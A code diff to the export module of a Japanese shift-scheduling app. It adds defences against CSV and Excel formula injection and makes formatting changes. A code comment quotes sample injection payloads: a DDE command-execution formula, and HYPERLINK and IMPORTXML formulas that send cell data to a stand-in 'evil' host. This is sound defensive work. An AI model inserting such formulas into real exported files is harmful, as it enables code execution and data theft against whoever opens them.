@@ -14,6 +14,7 @@ from datetime import date, datetime, time, timedelta
 from typing import Any
 
 import pandas as pd
+from openpyxl import load_workbook
 
 from shiftai.domain import (
     CellState,
@@ -65,7 +66,6 @@ EARLY_WINDOW = (time(7, 15), time(8, 30))
 LATE_WINDOW = (time(17, 15), time(19, 30))
 
 
-
 BOM = "﻿"
 
 ICS_PRODID = "-//shiftai//shift//JP"
@@ -107,7 +107,9 @@ def _work_blocks(day_slots: Sequence[Slot], states: Sequence[CellState]) -> list
     return blocks
 
 
-def _blocks_for(result: SolveResult, staff_id: str, shift_day: ShiftDay, slots: Sequence[Slot]) -> list[tuple[Slot, Slot]]:
+def _blocks_for(
+    result: SolveResult, staff_id: str, shift_day: ShiftDay, slots: Sequence[Slot]
+) -> list[tuple[Slot, Slot]]:
     return _work_blocks(slots, [shift_day.get(staff_id, s) for s in slots])
 
 
@@ -166,13 +168,17 @@ def shift_matrix_dataframe(
             matrix.append([CellState.OFF.value] * len(slots))
         else:
             matrix.append([shift_day.get(member.staff_id, s).value for s in slots])
-    frame = pd.DataFrame(matrix, index=[m.staff_id for m in staff], columns=[s.label for s in slots])
+    frame = pd.DataFrame(
+        matrix, index=[m.staff_id for m in staff], columns=[s.label for s in slots]
+    )
     frame.index.name = "職員ID"
     frame.columns.name = "時間帯"
     return frame
 
 
-def shift_matrices(result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMember]) -> pd.DataFrame:
+def shift_matrices(
+    result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMember]
+) -> pd.DataFrame:
     """全日を ``日付 / 曜日 / 職員ID / 時間帯…`` の 1 枚にまとめた表。"""
     frames = []
     for shift_day in result.shift_days:
@@ -263,9 +269,66 @@ def payroll_dataframe(
     return pd.DataFrame.from_records(records, columns=PAYROLL_DF_COLUMNS)
 
 
+#: Excel / Google スプレッドシートが **数式として解釈する** 先頭文字。
+#:
+#: 出力 CSV のセル値はユーザー入力（氏名・資格・園名など）を含むため、
+#: この文字で始まると利用者が Excel で開いた瞬間に実行される。
+#: 代表的な攻撃: ``=cmd|'/c calc'!A1`` / ``=HYPERLINK("http://evil/?d="&A1,"x")``
+#: / ``=IMPORTXML("http://evil/?d="&A1,"//a")``（GAS 経由で持股窃取）。
+#:
+#: タブ（``\t``）と carriage return（``\r``）も先頭にあると数式扱いされるため、
+#: 前後に空白がある場合も対象に含める。
+_CSV_FORMULA_PREFIX = re.compile(r"^[\s]*[=+\-@]")
+
+#: 数式として解釈させないための接頭辞。Excel は ``'`` の次の文字を文字列として扱う。
+_CSV_QUOTE_PREFIX = "'"
+
+
+def _neutralize_csv_formula(value: Any) -> Any:
+    """数式として解釈されうる文字列セルの先頭に ``'`` を付ける。
+
+    ``=1+1`` は「数式ではない文字列」なのでこの値が本物だが、
+    ``=cmd|'/c calc'!A1`` は実行であり、**利用者には区別がつかない**。
+    どちらを望んでいるか分からなくても、
+    「実行される」は常に「実行されない」より悪いので、無害化を優先する。
+    数値・``None`` はそのまま。数値に見える文字列（``-1`` / ``+2`` / ``-3.5``）は
+    Excel が数値として扱うので接頭辞を付けず、文字列のまま残す。
+    """
+    if not isinstance(value, str):
+        return value
+    if not _CSV_FORMULA_PREFIX.match(value):
+        return value
+    try:
+        float(value.replace(",", "").strip())
+    except ValueError:
+        pass
+    else:
+        return value
+    return _CSV_QUOTE_PREFIX + value
+
+
+def _neutralize_formula_cells(frame: pd.DataFrame) -> pd.DataFrame:
+    """DataFrame 全体の文字列セルを数式無効化したコピーを返す。
+
+    元の DataFrame は変更しない（呼び出し側の状態を壊さないため）。
+
+    **列名も対象にする**。``DataFrame.map`` は値を更新するが列名はそのままなので、
+    ``=`` で始まる列名（``data_loader`` が取り込み列名をそのまま使う場合に起こりうる）
+    は漏れる。列名は ``str`` に寄せてから無害化する。
+    """
+    out = frame.map(_neutralize_csv_formula)
+    out.columns = [
+        _neutralize_csv_formula(col) if isinstance(col, str) else col for col in frame.columns
+    ]
+    return out
+
+
 def to_csv_bytes(df: pd.DataFrame, *, bom: bool = True, index: bool = False) -> bytes:
-    """UTF-8（BOM 付き）CSV のバイト列。"""
-    text = df.to_csv(index=index)
+    """UTF-8（BOM 付き）CSV のバイト列。
+
+    出力前に :func:`_neutralize_formula_cells` で数式インジェクションを無効化する。
+    """
+    text = _neutralize_formula_cells(df).to_csv(index=index)
     data = text.encode("utf-8")
     return data if not bom or data.startswith(BOM.encode("utf-8")) else BOM.encode("utf-8") + data
 
@@ -284,13 +347,30 @@ def _safe_sheet_name(name: str, used: set[str]) -> str:
 
 
 def to_excel_bytes(sheets: Mapping[str, pd.DataFrame]) -> bytes:
-    """複数シートの .xlsx をバイト列で返す。"""
+    """複数シートの .xlsx をバイト列で返す。
+
+    **``.xlsx`` も数式インジェクションの対象になる**。
+    ``openpyxl`` はセルの文字列が ``=`` で始まると自動的に
+    ``data_type="f"``（数式）として書き出すため、CSV と同じ無害化が要る。
+    実測: ``ws["A2"].value == "=1+1"`` のとき ``ws["A2"].data_type == "f"``。
+    書き出した後に各セルの ``data_type`` を ``"s"`` に固定することで、
+    Excel は文字列として表示し、実行しない。
+    """
     buffer = io.BytesIO()
     used: set[str] = set()
     with pd.ExcelWriter(buffer, engine="openpyxl") as writer:
         for name, frame in sheets.items():
             frame.to_excel(writer, sheet_name=_safe_sheet_name(name, used), index=False)
-    return buffer.getvalue()
+    buffer.seek(0)
+    workbook = load_workbook(buffer)
+    for worksheet in workbook.worksheets:
+        for row in worksheet.iter_rows():
+            for cell in row:
+                if cell.data_type == "f":
+                    cell.data_type = "s"
+    out = io.BytesIO()
+    workbook.save(out)
+    return out.getvalue()
 
 
 def _ics_escape(text: str) -> str:
@@ -347,7 +427,9 @@ def to_ics(result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMemb
                 minutes = last.end_minutes - first.start_minutes
                 if minutes <= 0:
                     minutes += 24 * 60
-                uid = _UID_SAFE.sub("-", f"{member.staff_id}-{day:%Y%m%d}-{first.start:%H%M}-{last.end:%H%M}")
+                uid = _UID_SAFE.sub(
+                    "-", f"{member.staff_id}-{day:%Y%m%d}-{first.start:%H%M}-{last.end:%H%M}"
+                )
                 role_text = _role_text(member)
                 range_text = f"{first.label}〜{last.end.strftime('%H:%M')}"
                 summary = f"勤務: {member.name} ({format_jp_date(day)})"
@@ -370,7 +452,9 @@ def to_ics(result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMemb
     return "\r\n".join(_fold(line) for line in lines) + "\r\n"
 
 
-def _staff_totals(result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMember]) -> dict[str, dict[str, Any]]:
+def _staff_totals(
+    result: SolveResult, slots: Sequence[Slot], staff: Sequence[StaffMember]
+) -> dict[str, dict[str, Any]]:
     totals: dict[str, dict[str, Any]] = {}
     for member in staff:
         worked = 0
@@ -416,7 +500,9 @@ def _shortfall_info(result: SolveResult) -> tuple[int, int]:
         shortfall = sum(
             1
             for v in result.violations
-            if "不足" in v.message or "SHORTFALL" in v.code.upper() or "SHORTFALL" in str(v.code).upper()
+            if "不足" in v.message
+            or "SHORTFALL" in v.code.upper()
+            or "SHORTFALL" in str(v.code).upper()
         )
     blockers = len(result.blockers())
     return shortfall, blockers
@@ -444,7 +530,9 @@ def summary_markdown(
     out.append(f"# シフトサマリー: {title}")
     out.append("")
     if span:
-        out.append(f"- 対象期間: {format_jp_date_full(span[0])} 〜 {format_jp_date_full(span[1])}（{len(result.shift_days)} 日）")
+        out.append(
+            f"- 対象期間: {format_jp_date_full(span[0])} 〜 {format_jp_date_full(span[1])}（{len(result.shift_days)} 日）"
+        )
     out.append(f"- 最適化状態: {result.status.value}")
     if result.objective_value is not None:
         out.append(f"- 目的関数値: {result.objective_value:,.2f}")
